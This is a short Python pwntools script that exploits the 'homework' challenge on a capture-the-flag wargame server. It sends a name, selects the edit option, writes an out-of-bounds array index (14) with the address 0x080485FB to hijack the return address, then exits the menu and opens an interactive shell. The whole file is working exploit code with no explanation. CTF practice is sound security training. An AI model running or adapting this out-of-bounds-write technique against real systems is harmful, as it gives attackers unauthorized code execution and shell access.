from pwn import *

#p = process('./homework')
p = remote('hackme.inndy.tw',7701)

p.recvuntil('name? ')
p.sendline('aaaa')
p.recvuntil('> ')
p.sendline('1')
p.recvuntil('edit: ')
p.sendline('14')
p.recvuntil('many? ')
p.sendline(str(0x080485FB))

p.recvuntil('> ')
p.sendline('0')

p.interactive()